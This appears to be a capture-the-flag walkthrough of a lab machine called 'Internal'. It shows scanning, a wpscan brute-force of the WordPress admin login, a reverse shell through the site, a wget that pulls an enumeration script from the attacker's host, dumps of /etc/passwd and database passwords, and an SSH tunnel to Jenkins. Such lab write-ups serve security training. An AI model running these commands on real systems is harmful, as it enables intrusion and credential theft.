MY IP = **10.10.185.107**
VICTIM IP = 10.10.134.115

# Nmap scan

`nmap -A 10.10.134.115`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

```

22 --> SSH
80 --> HTTP => Apache/2.4.29

`nmap -sV --script vuln 10.10.134.115`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /blog/: Blog
|   /phpmyadmin/: phpMyAdmin
|   /wordpress/wp-login.php: Wordpress login page.
|_  /blog/wp-login.php: Wordpress login page.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
```


## Enumeration

`gobuster dir -u http://10.10.134.115 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

```
===============================================================
/blog (Status: 301)
/wordpress (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
===============================================================
```


### /blog/

![[Pasted image 20231012173102.png]]

in reasearch bar you can type something:

![[Pasted image 20231012173140.png]]

We can try a path traversal attack but no way.


### /wordpress/wp-login.php

`http://10.10.134.115/wordpress/wp-login.php`

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress

#### Get the wordPress version

![[Pasted image 20231012175132.png]]


version = 5.4.2

`wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://10.10.134.115/wordpress/wp-login.php --wordlist /usr/share/wordlists/SecLists/Passwords/probable-v2-top1575.txt --username admin`

`wpscan --url http://10.10.134.115/wordpress/wp-login.php --wordlist /usr/share/wordlists/SecLists/Passwords/probable-v2-top1575.txt --username admin`

--enumerate u


`wpscan --url http://10.10.134.115/wordpress/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin`

```
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

```

If `http://10.10.134.115/wordpress/wp-login.php` is no reachable, we must modify the hosts’ file at **_/etc/hosts_**.

![](https://threatninja.net/wp-content/uploads/2021/01/%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E3%82%B7%E3%83%A7%E3%83%83%E3%83%88-0003-01-10-9.06.58-1024x227.png)

We are in

![[Pasted image 20231014114428.png]]

Now we can obtain a reverse shell. (https://www.hackingarticles.in/wordpress-reverse-shell/)
Refresh the page `10.10.134.115/wordpress`

![[Pasted image 20231014115513.png]]

We have a rev-shell

![[Pasted image 20231014115609.png]]

Now stabilize shell:
    1. Use `python -c 'import pty;pty.spawn("/bin/bash")'` to *spawn a more feature-rich bash shell*.
    2. Export `TERM=xterm` to *access terminal commands* like `clear`.
    3. Background the shell using Ctrl + Z.
    4. In your own terminal, use `stty raw -echo; fg` to *turn off terminal echo and foreground the shell*.

There is a user called `aubreanna` but we can't access to its files.

![[Pasted image 20231014120442.png]]

```
www-data@internal:/$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin

aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash

mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false


```


### Enumeration of the system

```
www-data@internal:/$ env

APACHE_LOG_DIR=/var/log/apache2
LANG=C
INVOCATION_ID=cf201d483a024d4aba79b83b5bba2cf6
APACHE_LOCK_DIR=/var/lock/apache2
PWD=/
JOURNAL_STREAM=9:20121
APACHE_RUN_GROUP=www-data
APACHE_RUN_DIR=/var/run/apache2
APACHE_RUN_USER=www-data
APACHE_PID_FILE=/var/run/apache2/apache2.pid
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
_=/usr/bin/env
OLDPWD=/home
```

```
www-data@internal:/$ uname -a
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

```

try = https://www.exploit-db.com/raw/47167

on local machine => `python3 -m http.server 9000`
on victim => `wget http://10.10.185.107:9000/47167.sh`

```
[+] Searching Wordpress wp-config.php files
wp-config.php files found:
/var/www/html/wordpress/wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'wordpress123' );
define( 'DB_HOST', 'localhost' );

[+] Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root www-data 68 Aug  3  2020 /var/lib/phpmyadmin/blowfish_secret.inc.php
-rw-r----- 1 root www-data 0 Aug  3  2020 /var/lib/phpmyadmin/config.inc.php
-rw-r----- 1 root www-data 527 Aug  3  2020 /etc/phpmyadmin/config-db.php
-rw-r----- 1 root www-data 8 Aug  3  2020 /etc/phpmyadmin/htpasswd.setup

[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
-rw-r--r-- 1 root root 2319 Apr  4  2018 /etc/bash.bashrc
-rw-r--r-- 1 root root 646 Apr  7  2017 /etc/phpmyadmin/lighttpd.conf
Reading /etc/phpmyadmin/lighttpd.conf
alias.url += ( 
	"/phpmyadmin" => "/usr/share/phpmyadmin",
)
$HTTP["url"] =~ "^/phpmyadmin/templates" { 
    url.access-deny = ( "" ) 
}
$HTTP["url"] =~ "^/phpmyadmin/libraries" { 
    url.access-deny = ( "" ) 
}
$HTTP["url"] =~ "^/phpmyadmin/setup/lib" { 
    url.access-deny = ( "" ) 
}
$HTTP["url"] =~ "^/phpmyadmin/setup" {
	auth.backend = "htpasswd"
	auth.backend.htpasswd.userfile = "/etc/phpmyadmin/htpasswd.setup"
	auth.require = (
		"/" => (
			"method" => "basic",
			"realm" => "phpMyAdmin Setup",
			"require" => "valid-user"
		)
	)
}

-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 root root 3106 Sep 27  2019 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 2889 Dec  4  2017 /usr/share/byobu/profiles/bashrc
-rw-r--r-- 1 root root 2778 Aug 13  2017 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Aug 13  2017 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc


[+] Searching passwords in config PHP files
				case 'DB_PASSWORD':
		define( 'DB_PASSWORD', $pwd );
define( 'DB_PASSWORD', 'wordpress123' );
define( 'DB_PASSWORD', 'wordpress123' );
define('DB_PASSWORD', 'wordpress123');


```

SUID
```

====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/snap/core/9665/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount		--->	BSD/Linux(08-1996)
/snap/core/9665/usr/bin/chfn		--->	SuSE_9.3/10
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp		--->	HP-UX_10.20
/snap/core/9665/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/snap/core/9665/usr/bin/sudo		--->	/sudo$
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd		--->	Apple_Mac_OSX_10.4.8(05-2007)
/snap/core/8268/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount		--->	BSD/Linux(08-1996)
/snap/core/8268/usr/bin/chfn		--->	SuSE_9.3/10
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp		--->	HP-UX_10.20
/snap/core/8268/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/snap/core/8268/usr/bin/sudo		--->	/sudo$
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine

/bin/su
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/newgrp		--->	HP-UX_10.20
/usr/bin/newuidmap
/usr/bin/chfn		--->	SuSE_9.3/10
/usr/bin/newgidmap
/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/usr/bin/chsh
/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)
/usr/bin/sudo		--->	/sudo$
/usr/bin/pkexec		--->	Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/snap/core/9665/sbin/pam_extrausers_chkpwd
/snap/core/9665/sbin/unix_chkpwd
/snap/core/9665/usr/bin/chage
/snap/core/9665/usr/bin/crontab
/snap/core/9665/usr/bin/dotlockfile
/snap/core/9665/usr/bin/expiry
/snap/core/9665/usr/bin/mail-lock
/snap/core/9665/usr/bin/mail-touchlock
/snap/core/9665/usr/bin/mail-unlock
/snap/core/9665/usr/bin/ssh-agent
/snap/core/9665/usr/bin/wall
/snap/core/8268/sbin/pam_extrausers_chkpwd
/snap/core/8268/sbin/unix_chkpwd
/snap/core/8268/usr/bin/chage
/snap/core/8268/usr/bin/crontab
/snap/core/8268/usr/bin/dotlockfile
/snap/core/8268/usr/bin/expiry
/snap/core/8268/usr/bin/mail-lock
/snap/core/8268/usr/bin/mail-touchlock
/snap/core/8268/usr/bin/mail-unlock
/snap/core/8268/usr/bin/ssh-agent
/snap/core/8268/usr/bin/wall
/snap/core/8268/usr/lib/snapd/snap-confine
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd
/usr/bin/bsd-write
/usr/bin/crontab
/usr/bin/expiry
/usr/bin/chage
/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)
/usr/bin/ssh-agent
/usr/bin/mlocate
/usr/bin/wall
/usr/lib/x86_64-linux-gnu/utempter/utempter



```




```
www-data@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123


```


![[Pasted image 20231014125315.png]]

we are going to use SSH tunneling technique to forward Jenkins ip:port to our attacker machine’s ip:port.

`ssh -L 8081:172.17.0.2:8080 aubreanna@10.10.134.115 `


